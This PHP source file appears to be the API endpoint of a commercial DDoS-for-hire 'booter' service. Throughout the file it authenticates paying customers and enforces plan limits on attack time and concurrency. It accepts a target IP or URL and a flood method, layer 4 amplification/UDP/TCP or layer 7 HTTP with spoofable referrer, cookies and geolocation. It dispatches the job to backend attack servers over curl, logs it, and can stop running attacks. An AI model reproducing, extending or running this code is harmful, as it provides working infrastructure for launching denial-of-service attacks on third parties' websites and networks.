<?php

	require '../../../../backend/configuration/database.php';
	require '../../../../backend/configuration/funcsinit.php';


	
	if(isset($_GET['token'])){
		if(!empty($_GET['token'])){
			
			$token = htmlentities($user -> CheckInput($_GET['token']));
			
			if($user -> SecureText($token)){
				header('HTTP/1.0 400 Bad Request');
				exit();
			}	
			if($token == '0'){
				$errors[] = "Invalid API Token.";
	        	echo json_encode(array('status'=>'error', 'message'=>'Invalid API authorization token.'));
	        	die();
			}

			$CheckToken = $odb -> prepare("SELECT * FROM `users` WHERE `apitoken` = :token");
			$CheckToken -> execute(array(':token' => $token));
			$countuser = $CheckToken -> rowCount();
			$userinfo = $CheckToken -> fetch(PDO::FETCH_ASSOC);

			if($countuser == 0){
				$errors[] = "Invalid API Token.";
	        	echo json_encode(array('status'=>'error', 'message'=>'Invalid API authorization token.'));
	        	die();
			}

			$host = $_GET['host'];
			$time = intval($_GET['time']);
			$port = intval($_GET['port']);
			$method = $user -> CheckInput($_GET['method']);

			if($user -> SecureText($method)){
				header('HTTP/1.0 400 Bad Request');
				exit();
			}

			if(isset($_GET['concs'])){
				$concs = intval($_GET['concs']);
			}else{

			}
			if(isset($_GET['reqs'])){
				$reqs = $_GET['reqs'];
			}else if(empty($_GET['reqs'])){
				$reqs = '64';
			}
			if(isset($_GET['httpversion'])){
				$httpversion = htmlentities($user -> CheckInput($_GET['httpversion']));
			}else if(empty($_GET['httpversion'])){
				$httpversion = '0';
			}
			if(isset($_GET['req_method'])){
				$reqmethod = htmlentities($user -> CheckInput($_GET['req_method']));
			}else if(empty($_GET['req_method'])){
				$reqmethod = 'GET';
			}
			if(isset($_GET['referrer'])){
				$referrer = $_GET['referrer'];
			}else if(empty($_GET['referrer'])){
				$referrer = '0';
			}
			if(isset($_GET['cookies'])){
				$cookies = htmlentities($_GET['cookies']);
			}else if(empty($_GET['cookies'])){
				$cookies = '0';
			}
			if(isset($_GET['geoloc'])){
				$geoloc = htmlentities($user -> CheckInput($_GET['geoloc']));
			}else if(empty($_GET['geoloc'])){
				$geoloc = 'rand';
			}



			if(!empty($reqs)){
				if(!is_numeric($reqs)){
					$errors[] = "Invalid requests!";
		        	echo json_encode(array('status'=>'error', 'message'=>'Invalid requests value, required number format.'));
		        	die();
				}
			}
			if(!empty($referrer)){
				if (!filter_var($referrer, FILTER_VALIDATE_URL)) {
					$errors[] = "Invalid referrer!";
		        	echo json_encode(array('status'=>'error', 'message'=>'Invalid referrer format, required URL format!'));
		        	die();

				}
			}

			if(!empty($httpversion)){
				$httpversions = array('HTTP1', 'HTTP2');

				if(!in_array($httpversion, $httpversions)){
					$errors[] = "Invalid HTTP Version - required HTTP1/HTTP2.";
	        		echo json_encode(array('status'=>'error', 'message'=>'Invalid HTTP Version - required HTTP1 or HTTP2.'));
	        		die();
				}
			}

			if(!empty($geoloc)){
				$locations = array('rand', 'us', 'eu', 'ch', 'au');

				if(!in_array($geoloc, $locations)){
					$errors[] = "Invalid geoloc value";
	        		echo json_encode(array('status'=>'error', 'message'=>'Invalid GeoLocation value.'));
	        		die();
				}
			}

			if(empty($concs)){
				$concs = '1';
			}

            if($method == 'SHEX' || $method == "HANDSHAKE"){
                $errors[] = "BOTNET Methods are not allowed to use via API.";
                echo json_encode(array('status'=>'error', 'message'=>'BOTNET Methods are not allowed to use via API.'));
                die(); 
              }

			if($method != 'stop' && $method != 'stopall'){
			    if ($userinfo['plan'] == '0'){ 
			        $errors[] = "You do not have active paid membership.";
		        	echo json_encode(array('status'=>'error', 'message'=>'You do not have active paid membership.'));
		        	die();
			    }

			    $CheckAPI = $odb -> prepare("SELECT `plans`.`apiaccess` + `users`.`apiaccess` FROM `plans`,`users` WHERE `users`.`plan` = `plans`.`id` AND `users`.`apitoken` = :token");
			    $CheckAPI -> execute(array(':token' => $token));
			    $apiaccess = $CheckAPI -> fetchColumn(0);
				

				$SQLMethod = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `apiname` = :method AND `premium` = '1'");
				$SQLMethod -> execute(array(":method" => $method));
				$checkMethod = $SQLMethod ->fetchColumn(0);
				
				if ($checkMethod == "1") {
					$CheckPremium = $odb->prepare("SELECT `plans`.`premium` + `users`.`premium` FROM `plans`,`users` WHERE `users`.`plan` = `plans`.`id` AND `users`.`apitoken` = :token");
					$CheckPremium->execute([":token" => $token]);
					$haspremium = $CheckPremium->fetchColumn(0);
					if ($haspremium == "0") {
						$errors[] = "You do not have access to this method, please upgrade your plan!";
						ResponeSend("You do not have access to this method, please upgrade your plan.");
						die();
					}
				}
				
				$MethodDB = $odb -> prepare("SELECT * FROM `methods` WHERE `apiname` = :method");
				$MethodDB -> execute(array(':method' => $method));
				$methodinfo = $MethodDB -> fetch(PDO::FETCH_ASSOC);
				$countmethodd = $MethodDB -> rowCount();
				if($countmethodd == 0){
					$errors[] = "Invalid method.";
		          	echo json_encode(array('status'=>'error', 'message'=>'Invalid method.'));
		          	die(); 
				}
				$premiummethod = $methodinfo['premium'];
				$timelimit = $methodinfo['timelimit'];
				$methodtype = $methodinfo['type'];

				$layer4types = array('AMP', 'UDP', 'TCP', 'BOTNET');
				$layer7types = array('BASICL7', 'PREMIUML7');
				$freemethodtypes = array('FREEL4', 'FREEL7');

				if(in_array($methodtype, $freemethodtypes)){
					$errors[] = "You do not have access to this method.";
	        		echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method.'));
	        		die();
				}
				//  LAYER 4  ////////////////////////////////////////////////

				if(in_array($methodtype, $layer4types)){

					$UserInfoDB = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
				    $UserInfoDB -> execute(array(':id' => $userinfo['id']));
				    $user = $UserInfoDB -> fetch(PDO::FETCH_ASSOC);
				    $planid = $user['plan'];

					$Attacks = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `enddate` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
					$Attacks -> execute(array(':user' => $userinfo['username']));
					$runningattacks = $Attacks -> rowCount();

					$PlanInfo = $odb -> prepare("SELECT * FROM `plans` WHERE `id` = :planid");
					$PlanInfo -> execute(array(':planid' => $planid));

					$plan = $PlanInfo -> fetch(PDO::FETCH_ASSOC);

					$Addons = $odb -> prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
					$Addons -> execute(array(':username' => $userinfo['username']));

					$addon = $Addons -> fetch(PDO::FETCH_ASSOC);

					$totalconcs = $plan["concs"] + $addon["addon_concs"];
					$totalattacktime = $plan["time"] + $addon["addon_time"];

					if(empty($host) || empty($time) || empty($port) || empty($method) || $port < 0 || $port > 65500){
						$errors[] = "Please fill all required fields";
			        	echo json_encode(array('status'=>'error', 'message'=>'Please fill all required fields.'));
			        	die();
					}
					if($time < 30){
						$errors[] = "The minimum value for time is 30 seconds";
			        	echo json_encode(array('status'=>'error', 'message'=>'The minimum value for time is 30 seconds.'));
			        	die();
					}
					if (!filter_var($host, FILTER_VALIDATE_IP)) {
						$errors[] = "Invalid IP Address format!";
			        	echo json_encode(array('status'=>'error', 'message'=>'Invalid IP Address format!'));
			        	die();

					}
					if(!(filter_var($time, FILTER_SANITIZE_NUMBER_INT)) || !(filter_var($port, FILTER_SANITIZE_NUMBER_INT))){
						$errors[] = "Invalid port or time value!";
			        	echo json_encode(array('status'=>'error', 'message'=>'Invalid port or time value!'));
			        	die();
					}
					if(!filter_var($concs, FILTER_SANITIZE_NUMBER_INT)){
						$errors[] = "Invalid concs value!";
			        	echo json_encode(array('status'=>'error', 'message'=>'Invalid concs value!'));
			        	die();

					}

					if(($runningattacks + $concs) > $plan['concs']){
						$errors[] = "You can’t start as many attacks!";
			        	echo json_encode(array('status'=>'error', 'message'=>'You can’t start as many attacks!'));
			        	die();
					}

					if($concs > $totalconcs){
						$errors[] = "You reached max number of concurrents";
			        	echo json_encode(array('status'=>'error', 'message'=>'You reached max number of your plan concurrents!'));
			        	die();
					}

					if($time > $totalattacktime){
						$errors[] = "Maximum time";
			        	echo json_encode(array('status'=>'error', 'message'=>'Your maximum boot time is '.$totalattacktime.' seconds!'));
			        	die();
					}

					$SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
					$SQLBlacklist -> execute(array(':target' => "%{$host}%"));
					
					$countBlacklist = $SQLBlacklist -> rowCount();

					if ($countBlacklist > 0) {
						$errors[] = "This target is blacklisted";
			        	echo json_encode(array('status'=>'error', 'message'=>'This target is blacklisted!'));
			        	die();

					}



					
					if($timelimit != 0 && $time > $timelimit){
						$errors[] = "Only users with Free Plan can use this method!";
		    			echo json_encode(array('status'=>'error', 'message'=>'This method is limited on '.$timelimit.' seconds.'));
		    			die();
					}else if($timelimit == 0 || $timelimit != 0 && $time <= $timelimit){
						if(empty($errors)){
							$atck = 0;
								
								$SQLSelectServer = $odb -> prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
								$SQLSelectServer -> execute(array(':method' => "%{$method}%"));

								while ($server = $SQLSelectServer -> fetch(PDO::FETCH_ASSOC)) {
									if ($atck > 0) {
					                	break;
					            	}
									$name = $server['name'];

									$LogsDB = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `enddate` > UNIX_TIMESTAMP() AND `stopped` = 0");
									$LogsDB -> execute(array(':name' => "%{$name}%"));

									$countslots = $LogsDB -> rowCount();

									if ($countslots >= $server['slots']) {
					                	continue;
					            	}else if($concs >= $server['slots']){
					            		continue;
					            	}else if(($countslots+$concs) > $server['slots']){
						            	continue;
						            }
					            	$atck++;

					            	if($time > 600){
										$newtime = 600;
									}else{
										$newtime = $time;
									}

					            	$FindInApi = array('[host]', '[port]', '[time]', '[method]');
					            	$ApiReplace = array($host, $port, $newtime, $method);
					            	$API = $server['apiurl'];

					            	$handler[] = $server['name'];

					            	$APIReplaced = str_replace($FindInApi, $ApiReplace, $API);

					            	$handlers = @implode(",", $handler);

									$updateMethodStats = $odb -> prepare("UPDATE methods SET usageStats = usageStats + :concs WHERE apiname = :apiname");
									$updateMethodStats -> execute(array(':concs' => $concs, ':apiname' => $method));

					            	for ($x = 1; $x <= $concs; $x++) {
					            		$datee = date('Y-m-d H:i:s');
					            		$InsertLogs = $odb -> prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `enddate`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '1', UNIX_TIMESTAMP(NOW()), :enddate, :datetime)");

										$InsertLogs -> execute(array(':user' => $userinfo['username'], ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':concs' => $concs, ':handler' => $handlers, ':premium' => $premiummethod, ':enddate' => time() + $time, ':datetime' => $datee));

					            		$ch = curl_init();
					            		curl_setopt($ch, CURLOPT_URL, $APIReplaced);
								        curl_setopt($ch, CURLOPT_HEADER, 0);
								        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
								        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
								        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
								        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
								        $result = curl_exec($ch);
								        curl_close($ch);

								        if(!$result){
								        	$errors[] = "There is problem with API, please contact administrator!";
											echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
											die();
								        }
					            		
									}

								}
								if($atck == 0) {
					        		$errors[] = "No available slots!";
					    			echo json_encode(array('status'=>'error', 'message'=>'No available slots for your attack!'));
					    			die();	
					        	}
								echo json_encode(array('status'=>'success', 'message'=>'Attack successfully sent!'));
								die();
					     
					    }//EMPTY ERRORS
					}//TIMELIMIT END
				//  LAYER 7  ////////////////////////////////////////////////

				}else if(in_array($methodtype, $layer7types)){

					
					$port = 80;
					

					
					

					$UserInfoDB = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
				    $UserInfoDB -> execute(array(':id' =>$userinfo['id']));
				    $user = $UserInfoDB -> fetch(PDO::FETCH_ASSOC);
				    $planid = $user['plan'];

					$Attacks = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `enddate` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
					$Attacks -> execute(array(':user' => $userinfo['username']));
					$runningattacks = $Attacks -> rowCount();

					$PlanInfo = $odb -> prepare("SELECT * FROM `plans` WHERE `id` = :planid");
					$PlanInfo -> execute(array(':planid' => $planid));

					$plan = $PlanInfo -> fetch(PDO::FETCH_ASSOC);

					$Addons = $odb -> prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
					$Addons -> execute(array(':username' => $userinfo['username']));

					$addon = $Addons -> fetch(PDO::FETCH_ASSOC);

					$totalconcs = $plan["concs"] + $addon["addon_concs"];
					$totalattacktime = $plan["time"] + $addon["addon_time"];

					if(empty($host) || empty($time) || empty($method) || $port != 80){
						$errors[] = "Please fill all required fields";
			        	echo json_encode(array('status'=>'error', 'message'=>'Please fill all required fields.'));
			        	die();
					}
					if($reqs > 64){
						$errors[] = "Invalid requets per ip value!";
			        	echo json_encode(array('status'=>'error', 'message'=>'Invalid Requests per IP value!'));
			        	die();
					}
					if($time < 30){
						$errors[] = "The minimum value for time is 30 seconds";
			        	echo json_encode(array('status'=>'error', 'message'=>'The minimum value for time is 30 seconds.'));
			        	die();
					}
					if (!filter_var($host, FILTER_VALIDATE_URL)) {
						$errors[] = "Invalid URL format!";
			        	echo json_encode(array('status'=>'error', 'message'=>'Invalid URL format!'));
			        	die();

					}
					
					$requestmethods = array('GET', 'POST', 'HEAD');
					if(!in_array($reqmethod, $requestmethods)){
						$errors[] = "Invalid request method value!";
			        	echo json_encode(array('status'=>'error', 'message'=>'Invalid request method value!'));
			        	die();
					}
					if(!(filter_var($time, FILTER_SANITIZE_NUMBER_INT)) || !(filter_var($concs, FILTER_SANITIZE_NUMBER_INT))){
						$errors[] = "Invalid port or time value!";
			        	echo json_encode(array('status'=>'error', 'message'=>'Invalid port or time value!'));
			        	die();
					}

					if(($runningattacks + $concs) > $plan['concs']){
						$errors[] = "You can’t start as many attacks!";
			        	echo json_encode(array('status'=>'error', 'message'=>'You can’t start as many attacks!'));
			        	die();
					}

					if($concs > $totalconcs){
						$errors[] = "You reached max number of concurrents";
			        	echo json_encode(array('status'=>'error', 'message'=>'You reached max number of your plan concurrents!'));
			        	die();
					}

					if($time > $totalattacktime){
						$errors[] = "Maximum time";
			        	echo json_encode(array('status'=>'error', 'message'=>'Your maximum boot time is '.$totalattacktime.' seconds!'));
			        	die();
					}

					$SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
					$SQLBlacklist -> execute(array(':target' => "%{$host}%"));
					
					$countBlacklist = $SQLBlacklist -> rowCount();

					if ($countBlacklist > 0) {
						$errors[] = "This target is blacklisted";
			        	echo json_encode(array('status'=>'error', 'message'=>'This target is blacklisted!'));
			        	die();

					}


					$BLUrl = $odb -> prepare("SELECT * FROM `blacklist` WHERE `type` = 'URL'");
					$BLUrl -> execute(); 

					$urlarrs = array();
					while($url = $BLUrl -> fetch(PDO::FETCH_ASSOC)){
						$urlarrs[] = $url['target'];
					}

					foreach ($urlarrs as $urlarr) {
						if(strpos($host, $urlarr)) {
							$errors[] = "This website is blacklisted";
							echo json_encode(array('status'=>'error', 'message'=>'This website is blacklisted.'));
							die();
					
						}
					}



					$BLDomain = $odb -> prepare("SELECT * FROM `blacklist` WHERE `type` = 'DOMAIN'");
					$BLDomain -> execute();

					$parameters = array();
					while($domain = $BLDomain -> fetch(PDO::FETCH_ASSOC)){
						$parameters[] = $domain['target'];
					}
						
					foreach ($parameters as $parameter) {
						if(strpos($host, $parameter)) {
							$errors[] = "This domain is blacklisted";
							echo json_encode(array('status'=>'error', 'message'=>'This domain is blacklisted.'));
							die();
					
						}
					}
					

					
					
					if($timelimit != 0 && $time > $timelimit){
						$errors[] = "Only users with Free Plan can use this method!";
		    			echo json_encode(array('status'=>'error', 'message'=>'This method is limited on '.$timelimit.' seconds.'));
		    			die();
					}else if($timelimit == 0 || $timelimit != 0 && $time <= $timelimit){
						if(empty($errors)){
							$atck = 0;
								
								$SQLSelectServer = $odb -> prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
								$SQLSelectServer -> execute(array(':method' => "%{$method}%"));

									
									while ($server = $SQLSelectServer -> fetch(PDO::FETCH_ASSOC)) {
										
									
										if ($atck > 0) {
						                	break;
						            	}
										$name = $server['name'];

										$LogsDB = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `enddate` > UNIX_TIMESTAMP() AND `stopped` = 0");
										$LogsDB -> execute(array(':name' => "%{$name}%"));

										$countslots = $LogsDB -> rowCount();

										if ($countslots >= $server['slots']) {
						                	continue;
						            	}else if($concs >= $server['slots']){
						            		continue;
						            	}else if(($countslots+$concs) > $server['slots']){
						            		continue;
						            	}
						            	$atck++;

						            	

						            	$FindInApi = array('[host]', '[port]', '[time]', '[method]', '[reqmethod]', '[reqs]', '[version]', '[referrer]', '[cookies]', '[geo]');
						            	$ApiReplace = array($host, $port, $time, $method, $reqmethod, $reqs, $httpversion, $referrer, $cookies, $geoloc);
						            	$API = $server['apiurl'];

						            	$handler[] = $server['name'];

						            	$APIReplaced = str_replace($FindInApi, $ApiReplace, $API);

						            	$handlers = @implode(",", $handler);

										$updateMethodStats = $odb -> prepare("UPDATE methods SET usageStats = usageStats + :concs WHERE apiname = :apiname");
										$updateMethodStats -> execute(array(':concs' => $concs, ':apiname' => $method));

						            	for ($x = 1; $x <= $concs; $x++) {
											$datee = date('Y-m-d H:i:s');
						            		$InsertLogs = $odb -> prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `enddate`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '1', UNIX_TIMESTAMP(NOW()), :enddate, :datetime)");

											$InsertLogs -> execute(array(':user' => $userinfo['username'], ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':concs' => $concs, ':handler' => $handlers, ':premium' => $premiummethod, ':enddate' => time() + $time, ':datetime' => $datee));
											// echo $methodupdated;
						            		$ch = curl_init();
						            		curl_setopt($ch, CURLOPT_URL, $APIReplaced);
									        curl_setopt($ch, CURLOPT_HEADER, 0);
									        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
									        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
									        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
									        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
									        $result = curl_exec($ch);
									        curl_close($ch);

									       	//echo $result;
									       	//echo $APIReplaced;
						            		
						            		if(!$result){
									        	$errors[] = "There is problem with API, please contact administrator!";
												echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
												die();
									        }
						            		
										}

									}



								if($atck == 0) {
					        		$errors[] = "No available slots for your attack!";
					    			echo json_encode(array('status'=>'error', 'message'=>'No available slots for your attack!'));
					    			die();	
					        	}
								echo json_encode(array('status'=>'success', 'message'=>'Attack successfully sent!'));
								die();
					     
					    }//EMPTY ERRORS
					}//TIMELIMIT END
				}//IF METHOD END
			}else if($method == 'stop'){

				
				$SelectAttack = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `enddate` > UNIX_TIMESTAMP() AND `user` = :username AND `target` = :target");
		    	$SelectAttack -> execute(array('username' => $userinfo['username'], ':target' => $host));
		    	$info = $SelectAttack -> fetch(PDO::FETCH_ASSOC);
		    	$countattacks = $SelectAttack -> rowCount();

		    	if($countattacks == 0){
		    		$errors[] = "There is no running attacks on this target!";
					echo json_encode(array('status'=>'error', 'message'=>'There is no running attacks on this target!'));
					die();
		    	}

		    	
		    	if(empty($errors)){
		    		$handler = $info['servers'];
		    		$handlers = explode(",", $handler);

		    		foreach ($handlers as $handler){
				    	$SQLSelectAPI = $odb->prepare("SELECT `apiurl` FROM `servers` WHERE `name` = :handler ORDER BY `id` DESC");
				    	$SQLSelectAPI -> execute(array(':handler' => $handler));
				    	while($api = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC)){
				    		$stopcommand = "stop";
					    	$FindInApi = array('[host]', '[port]', '[time]', '[method]');
							$ApiReplace = array($info['target'], $info['port'], $info['time'], $stopcommand);
							
					        $APIReplaced = str_replace($FindInApi, $ApiReplace, $api['apiurl']);
					        
					        
					        $stopapi = $APIReplaced;
					        $ch = curl_init();
					        curl_setopt($ch, CURLOPT_URL, $stopapi);
					        curl_setopt($ch, CURLOPT_HEADER, 0);
					        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
					        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
					        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
					        $result = curl_exec($ch);
					        curl_close($ch);
					        //echo $result;
				    	}
			    	}	
			        if(!$result){
			        	$errors[] = "There is problem with API, please contact administrator!";
						echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
						die();
			        }

					$UpdateAttack = $odb -> prepare("UPDATE `attacklogs` SET `stopped` = 1 WHERE `target` = :target");
					$UpdateAttack -> execute(array(':target' => $host));

		    		echo json_encode(array('status'=>'success', 'message'=>'Attack on '.$host.' successfully stopped!'));

		    	}
				


			}else if($method == 'stopall'){
				
				$SelectAttack = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `enddate` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `user` = :username");
		    	$SelectAttack -> execute(array(':username' => $userinfo['username']));
		    	$info = $SelectAttack -> fetch(PDO::FETCH_ASSOC);
		    	$countattacks = $SelectAttack -> rowCount();


		    	if($countattacks == 0){
		    		$errors[] = "There is no running attacks.";
					echo json_encode(array('status'=>'error', 'message'=>'There is no running attacks.'));
					die();
		    	}
		    	

		    	if(empty($errors)){
		    		$handler = $info['servers'];
		    		$handlers = explode(",", $handler);

		    		foreach ($handlers as $handler){
				    	$SQLSelectAPI = $odb->prepare("SELECT `apiurl` FROM `servers` WHERE `name` = :handler ORDER BY `id` DESC");
				    	$SQLSelectAPI -> execute(array(':handler' => $handler));
				    	$api = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC);
				    	$SelectAttackk = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `enddate` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `user` = :username");
		    			$SelectAttackk -> execute(array(':username' => $userinfo['username']));
				    	while($infoo = $SelectAttackk -> fetch(PDO::FETCH_ASSOC)) {
				    		$target = $infoo['target'];
				    		$port = $infoo['port'];
				    		$time = $infoo['time'];
				    		
				    		$stopcommand = "stop";
					    	$FindInApi = array('[host]', '[port]', '[time]', '[method]');
							$ApiReplace = array($info['target'], $info['port'], $info['time'], $stopcommand);
							
					        $APIReplaced = str_replace($FindInApi, $ApiReplace, $api['apiurl']);
					        
					        
					        $stopapi = $APIReplaced;
					        $ch = curl_init();
					        curl_setopt($ch, CURLOPT_URL, $stopapi);
					        curl_setopt($ch, CURLOPT_HEADER, 0);
					        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
					        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
					        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
					        $result = curl_exec($ch);
					        curl_close($ch);
				    	}
			    	}	
			        if(!$result){
			        	$errors[] = "There is problem with API, please contact administrator!";
						echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
						die();
			        }

					$UpdateAttack = $odb -> prepare("UPDATE `attacklogs` SET `stopped` = 1 WHERE `enddate` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `user` = :user");
					$UpdateAttack -> execute(array(':user' => $userinfo['username']));

		    		echo json_encode(array('status'=>'success', 'message'=>'All running attacks successfully stopped!'));

		    	}
			

		    }//STOPALL END IF
		}else{
			$errors[] = "Invalid API Token.";
        	echo json_encode(array('status'=>'error', 'message'=>'Please provide API authorization token.'));
        	die();
		}
	}else{
		$errors[] = "Invalid API Token.";
    	echo json_encode(array('status'=>'error', 'message'=>'Please provide API authorization token.'));
    	die();
	}











?>